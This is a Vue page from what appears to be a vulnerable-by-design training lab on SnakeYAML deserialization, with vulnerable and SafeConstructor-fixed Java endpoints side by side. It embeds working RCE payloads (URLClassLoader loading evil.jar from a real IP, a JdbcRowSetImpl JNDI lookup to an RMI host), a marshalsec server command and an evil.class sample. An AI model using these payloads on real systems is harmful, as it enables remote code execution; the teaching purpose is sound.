<template>
    <div class="root-div">
        <div class="vuln-info">
            <div class="header-div">组件漏洞 -- SnakeYAML反序列化漏洞</div>
            <div class="body-div">
                <el-tabs v-model="activeName" @tab-click="handleClick">
                    <el-tab-pane label="漏洞描述" name="first">
                        <div class="vuln-detail">
                            SnakeYAML反序列化漏洞是指由于使用不安全的YAML解析配置，导致攻击者可以通过构造恶意YAML数据触发反序列化漏洞，从而在目标系统上执行任意代码。<br/>
                            <br/>
                            漏洞原理：<br/>
                            1. SnakeYAML默认使用Constructor类进行对象反序列化<br/>
                            2. 攻击者可以通过YAML标签语法（如!!）指定任意类进行实例化<br/>
                            3. 利用ScriptEngineManager、URLClassLoader等危险类加载恶意代码<br/>
                            4. 通过JNDI注入、DNS探测等方式实现远程代码执行<br/>
                            <br/>
                            常见原因：<br/>
                            1. 使用默认的Yaml构造函数而非SafeConstructor<br/>
                            2. 未对输入数据进行严格的类型验证和过滤<br/>
                            3. 启用了危险的类加载功能<br/>
                            4. 未升级到安全版本的SnakeYAML库<br/>
                        </div>
                    </el-tab-pane>
                    <el-tab-pane label="漏洞危害" name="second">
                        <div class="vuln-detail">
                            1. 远程代码执行（RCE）：攻击者可以在目标系统上执行任意命令<br/>
                            2. 文件系统操作：可以读取、写入、删除系统文件<br/>
                            3. 网络连接：可以建立网络连接，进行数据外泄或反向连接<br/>
                            4. 系统信息泄露：可以获取系统配置、环境变量等敏感信息<br/>
                            5. 权限提升：可能获取更高权限，完全控制目标系统<br/>
                            6. 横向移动：在内部网络中进一步扩散攻击<br/>
                            7. 数据泄露：可能导致数据库密码、API密钥等敏感数据泄露<br/>
                            8. 拒绝服务：通过恶意代码消耗系统资源，导致服务不可用<br/>
                        </div>
                    </el-tab-pane>
                    <el-tab-pane label="安全编码" name="third">
                        <div class="vuln-detail">
                            【必须】使用SafeConstructor替代默认构造函数<br/>
                            生产环境中必须使用new Yaml(new SafeConstructor())，避免使用默认的Yaml构造函数，防止任意类实例化。<br/>
                            <br/>
                            【必须】升级到安全版本的SnakeYAML<br/>
                            升级到SnakeYAML 2.0+版本，新版本默认使用SafeConstructor，并修复了多个安全漏洞。<br/>
                            <br/>
                            【必须】配置类白名单和类型验证<br/>
                            使用Constructor类配置允许反序列化的类白名单，明确指定可信任的类，禁止危险类的加载。<br/>
                            <br/>
                            【建议】对输入数据进行严格验证<br/>
                            对YAML输入数据进行格式验证、类型检查，确保只处理预期的数据结构。<br/>
                            <br/>
                            【建议】使用安全的YAML解析方式<br/>
                            考虑使用其他更安全的YAML解析库，或实现自定义的安全解析逻辑。
                        </div>
                    </el-tab-pane>
                    <el-tab-pane label="参考文章" name="fourth">
                        <div class="vuln-detail">
                            <b>相关技术文档和参考资源：</b>
                            <br/><br/>
                            <b>官方文档：</b>
                            <ul>
                                <li><a href="https://bitbucket.org/asomov/snakeyaml/wiki/Home" target="_blank" style="text-decoration: underline;">SnakeYAML官方文档</a></li>
                                <li><a href="https://bitbucket.org/asomov/snakeyaml/wiki/Documentation" target="_blank" style="text-decoration: underline;">SnakeYAML使用指南</a></li>
                            </ul>
                            <br/>
                            <b>安全最佳实践：</b>
                            <ul>
                                <li><a href="https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization" target="_blank" style="text-decoration: underline;">OWASP A08:2021 - 软件和数据完整性故障</a></li>
                                <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html" target="_blank" style="text-decoration: underline;">OWASP反序列化安全检查清单</a></li>
                            </ul>
                            <br/>
                            <b>漏洞分析文章：</b>
                            <ul>
                                <li><a href="https://github.com/artsploit/yaml-payload" target="_blank" style="text-decoration: underline;">SnakeYAML反序列化漏洞分析</a></li>
                                <li><a href="https://blog.csdn.net/qq_45521281/article/details/106647490" target="_blank" style="text-decoration: underline;">SnakeYAML反序列化漏洞复现</a></li>
                                <li><a href="https://www.veracode.com/blog/secure-development/deserialization-vulnerabilities" target="_blank" style="text-decoration: underline;">反序列化漏洞安全分析</a></li>
                            </ul>
                            <br/>
                            <b>工具和检测：</b>
                            <ul>
                                <li><a href="https://github.com/frohoff/ysoserial" target="_blank" style="text-decoration: underline;">ysoserial - 反序列化漏洞利用工具</a></li>
                                <li><a href="https://github.com/artsploit/yaml-payload" target="_blank" style="text-decoration: underline;">YAML Payload生成工具</a></li>
                                <li><a href="https://github.com/OWASP/CheatSheetSeries" target="_blank" style="text-decoration: underline;">OWASP安全配置检查清单</a></li>
                            </ul>
                        </div>
                    </el-tab-pane>
                </el-tabs>
            </div>
        </div>
        <div class="code-demo">
            <el-row :gutter="20" class="grid-flex">
                <el-col :span="12">
                    <div class="grid-content bg-purple">
                        <el-row type="flex" justify="space-between" align="middle">漏洞代码<div>
                                <el-button type="danger" round size="mini"
                                    @click="fetchDataAndFillTable1">去测试</el-button>
                            </div></el-row>
                        <pre v-highlightjs><code class="java">// 漏洞复现步骤
1、构造恶意类，并编译成 evil.class 文件
    import java.lang.Runtime;
    import java.lang.Process;
    import java.io.IOException;
    import java.io.FileWriter;

    public class evil {
        public evil (){
            try{
                // Runtime.getRuntime().exec("calc.exe"); // Windows本地源码部署
                // Runtime.getRuntime().exec("open -a Calculator"); // macOS本地源码部署
                String content = "This is a test flag";
                String filePath = "/app/flag.txt";
                
                FileWriter writer = new FileWriter(filePath);
                writer.write(content);
                writer.close();
            }catch (Exception e){
                e.printStackTrace();
            }
        }
        public static void main(String[] argv){
            evil e = new evil();
        }
    }

2、将 evil.class 放到任意http服务器上(如：python3 -m http.server 8088)
3、部署rmi/ldap服务，关联静态恶意类（如：java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://xx.xx.xx.xx:8088/#evil" 9999）
4、发送payload请求到SnakeYAML漏洞接口
    !!com.sun.rowset.JdbcRowSetImpl {dataSourceName: 'rmi://150.109.15.229:9999/evilfile', autoCommit: true}

注意：需要在项目中配置启用 RMI 协议支持从远程服务器加载 Java 对象：System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");

// 后端代码
@RestController
@Slf4j
@RequestMapping("/components")
public class SnakeYAMLController {

    @PostMapping("/snakeyamlVuln1")
    public Result snakeyamlVuln1(@RequestBody String yaml) {
        log.info("请求参数: {}", yaml);
        try {
            Yaml yamlParser = new Yaml();
            Object object = yamlParser.load(yaml);
            return Result.success(object.toString());
        } catch (Exception e) {
            return Result.error(e.toString());
        }
    }
}
</code></pre>
                    </div>
                </el-col>
                <el-col :span="12">
                    <div class="grid-content bg-purple">
                        <el-row type="flex" justify="space-between" align="middle">安全代码 - 使用SafeConstructor <el-button
                                type="success" round size="mini"
                                @click="fetchDataAndFillTable2">去测试</el-button></el-row>
                        <pre v-highlightjs><code class="java">说明：下面的代码使用SafeConstructor，可以有效防止恶意攻击

// 后端代码
@RestController
@Slf4j
@RequestMapping("/components")
public class SnakeYAMLController {

    @PostMapping("/snakeyamlSec1")
    public Result snakeyamlSec1(@RequestBody String yaml) {
        log.info("请求参数: {}", yaml);
        try {
            // 使用SafeConstructor防止反序列化漏洞
            Yaml yamlParser = new Yaml(new SafeConstructor());
            Object object = yamlParser.load(yaml);
            return Result.success(object.toString());
        } catch (Exception e) {
            return Result.error(e.toString());
        }
    }
}
</code></pre>
                    </div>
                </el-col>
            </el-row>
            <el-row :gutter="20" class="grid-flex">
                <el-col :span="12">
                </el-col>
                <el-col :span="12">
                    <div class="grid-content bg-purple">
                        <el-row type="flex" justify="space-between" align="middle">安全代码 - 升级到安全版本</el-row>
                        <pre v-highlightjs><code class="java">// 在pom.xml中升级SnakeYAML版本到2.0+，新版本默认使用SafeConstructor

&lt;dependency&gt;
    &lt;groupId&gt;org.yaml&lt;/groupId&gt;
    &lt;artifactId&gt;snakeyaml&lt;/artifactId&gt;
    &lt;version&gt;2.0&lt;/version&gt;
&lt;/dependency&gt;

</code></pre>
                    </div>
                </el-col>
            </el-row>
        </div>

        <!-- 打开嵌套表格的对话框1 -->
        <el-dialog title="SnakeYAML反序列化测试" :visible.sync="dialogFormVisible1" class="center-dialog">
            <div style="text-align: left; color: red; font-style: italic;">
                注意，需要提前先完成下面准备工作：<br>
                1、DNS探测：需要配置DNSLog平台<br>
                2、恶意Object：将 evil.class 放到任意http服务器上(如：python3 -m http.server 8088)<br>
                3、JNDI注入：部署rmi/ldap服务，关联静态恶意类（如：java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer
                "http://xx.xx.xx.xx:8088/#evil" 9999）
            </div>
            <el-form class="demo-form-inline">
                <el-form-item label="正常Payload">
                    <el-input v-model="yamlString1" type="textarea"></el-input>
                </el-form-item>
                <el-form-item label="DNS探测Payload">
                    <el-input v-model="dnsPayload" type="textarea"></el-input>
                </el-form-item>
                <el-form-item label="恶意Object Payload">
                    <el-input v-model="evilPayload" type="textarea"></el-input>
                </el-form-item>
                <el-form-item label="JNDI注入Payload">
                    <el-input v-model="jndiPayload" type="textarea"></el-input>
                </el-form-item>
                <el-form-item>
                    <el-button type="primary" @click="onSubmit11">正常请求</el-button>
                    <el-button type="warning" @click="onSubmitDns">DNS探测</el-button>
                    <el-button type="danger" @click="onSubmitEvil">恶意Object</el-button>
                    <el-button type="danger" @click="onSubmitJndi">JNDI注入</el-button>
                </el-form-item>
            </el-form>
            <div>
                <template>
                    <div v-html="resp_text1"></div>
                </template>
            </div>
        </el-dialog>

        <!-- 打开嵌套表格的对话框2 -->
        <el-dialog title="SnakeYAML安全代码测试" :visible.sync="dialogFormVisible2" class="center-dialog">
            <div style="text-align: left; color: green; font-style: italic;">
                安全代码使用SafeConstructor，可以有效防止恶意攻击
            </div>
            <el-form class="demo-form-inline">
                <el-form-item label="正常Payload">
                    <el-input v-model="yamlString1" type="textarea"></el-input>
                </el-form-item>
                <el-form-item label="DNS探测Payload">
                    <el-input v-model="dnsPayload" type="textarea"></el-input>
                </el-form-item>
                <el-form-item label="恶意Object Payload">
                    <el-input v-model="evilPayload" type="textarea"></el-input>
                </el-form-item>
                <el-form-item label="JNDI注入Payload">
                    <el-input v-model="jndiPayload" type="textarea"></el-input>
                </el-form-item>
                <el-form-item>
                    <el-button type="primary" @click="onSubmit21">正常请求</el-button>
                    <el-button type="warning" @click="onSubmitDnsSec">DNS探测</el-button>
                    <el-button type="danger" @click="onSubmitEvilSec">恶意Object</el-button>
                    <el-button type="danger" @click="onSubmitJndiSec">JNDI注入</el-button>
                </el-form-item>
            </el-form>
            <div>
                <template>
                    <div v-html="resp_text1"></div>
                </template>
            </div>
        </el-dialog>
    </div>
</template>

<script>
import { snakeyamlVuln1, snakeyamlSec1, basicTest } from '@/api/snakeyaml';

export default {
    data() {
        return {
            activeName: 'first',
            dialogFormVisible1: false,
            dialogFormVisible2: false,
            payload1: "!!icu.secnotes.pojo.Person {age: 25, name: 张三}",
            dnsPayload: "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[http://dddd.ed1rji.dnslog.cn]]]",
            evilPayload: "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[http://45.62.116.169:8080/evil.jar]]]",
            jndiPayload: "!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: 'rmi://150.109.15.229:9999/evilfile', autoCommit: true}",
            resp_text1: '',
        };
    },
    computed: {
        yamlString1: {
            get() {
                return this.payload1;
            },
            set(newVal) {
                this.payload1 = newVal;
            }
        }
    },
    methods: {
        handleClick(tab, event) {
            // 标签页切换处理
        },
        fetchDataAndFillTable1() {
            this.dialogFormVisible1 = true;
            this.resp_text1 = '';
        },
        fetchDataAndFillTable2() {
            this.dialogFormVisible2 = true;
            this.resp_text1 = '';
        },
        onSubmit11() {
            if (!this.payload1) {
                this.$message.error('payload不能为空');
                return;
            }
            basicTest(this.payload1).then(response => {
                this.resp_text1 = response.data;
            }).catch(error => {
                console.error('Error fetching data:', error);
            });
        },

        onSubmitDns() {
            if (!this.dnsPayload) {
                this.$message.error('DNS探测Payload不能为空');
                return;
            }
            snakeyamlVuln1(this.dnsPayload).then(response => {
                this.resp_text1 = response.data + "，请检查DNSLog平台";
            }).catch(error => {
                console.error('Error fetching data:', error);
                this.resp_text1 = 'Error fetching data: ' + error.message;
            });
        },
        onSubmitEvil() {
            if (!this.evilPayload) {
                this.$message.error('恶意Object Payload不能为空');
                return;
            }
            snakeyamlVuln1(this.evilPayload).then(response => {
                this.resp_text1 = response.data;
            }).catch(error => {
                console.error('Error fetching data:', error);
                this.resp_text1 = 'Error fetching data: ' + error.message;
            });
        },
        onSubmitJndi() {
            if (!this.jndiPayload) {
                this.$message.error('JNDI注入Payload不能为空');
                return;
            }
            snakeyamlVuln1(this.jndiPayload).then(response => {
                this.resp_text1 = response.data;
            }).catch(error => {
                this.resp_text1 = 'Error fetching data: ' + error.message;
            });
        },
        onSubmit21() {
            if (!this.payload1) {
                this.$message.error('payload不能为空');
                return;
            }
            snakeyamlSec1(this.payload1).then(response => {
                this.resp_text1 = response.data;
            }).catch(error => {
                console.error('Error fetching data:', error);
            });
        },

        onSubmitDnsSec() {
            if (!this.dnsPayload) {
                this.$message.error('DNS探测Payload不能为空');
                return;
            }
            snakeyamlSec1(this.dnsPayload).then(response => {
                this.resp_text1 = response.data + "，SafeConstructor阻止了DNS探测";
            }).catch(error => {
                console.error('Error fetching data:', error);
                this.resp_text1 = 'SafeConstructor成功阻止了DNS探测攻击: ' + error.message;
            });
        },
        onSubmitEvilSec() {
            if (!this.evilPayload) {
                this.$message.error('恶意Object Payload不能为空');
                return;
            }
            snakeyamlSec1(this.evilPayload).then(response => {
                this.resp_text1 = response.data;
            }).catch(error => {
                console.error('Error fetching data:', error);
                this.resp_text1 = 'SafeConstructor成功阻止了恶意Object攻击: ' + error.message;
            });
        },
        onSubmitJndiSec() {
            if (!this.jndiPayload) {
                this.$message.error('JNDI注入Payload不能为空');
                return;
            }
            snakeyamlSec1(this.jndiPayload).then(response => {
                this.resp_text1 = response.data;
            }).catch(error => {
                console.error('Error fetching data:', error);
                this.resp_text1 = 'SafeConstructor成功阻止了JNDI注入攻击: ' + error.message;
            });
        },
    }
};
</script>

<style>
.vuln-info {
    border-radius: 10px;
    margin: 10px 20px 20px 20px;
}

.header-div {
    font-size: 24px;
    color: #409EFF;
    font-weight: bold;
    padding: 10px;
    justify-content: center;
    align-items: center;
    border-bottom: 1px solid #ccc;
}

.body-div {
    padding: 10px;
    justify-content: center;
    align-items: center;
    font-family: Arial, sans-serif;
    font-size: 14px;
}

.vuln-detail {
    background-color: #dce9f8;
    padding: 10px;

}

.code-demo {
    margin: 20px;
    border-top: 1px solid #ccc;
    padding-top: 20px;
}

pre code {
    font-size: 12px;
}

.el-row {
    margin-bottom: 20px;
}

.el-row:last-child {
    margin-bottom: 0;
}

.el-col {
    border-radius: 4px;
}

.bg-purple-dark {
    background: #99a9bf;
}

.bg-purple {
    background: #d3dce6;
}

.bg-purple-light {
    background: #e5e9f2;
}

.grid-content {
    border-radius: 4px;
    height: 100%;
    padding: 10px;
}

.grid-flex {
    display: flex;
    align-items: stretch;
}

.row-bg {
    padding: 10px 0;
    background-color: #f9fafc;
}

.center-dialog {
    text-align: center;
    margin: 0 auto;
}

.center-dialog-table {
    text-align: center;
}
</style> 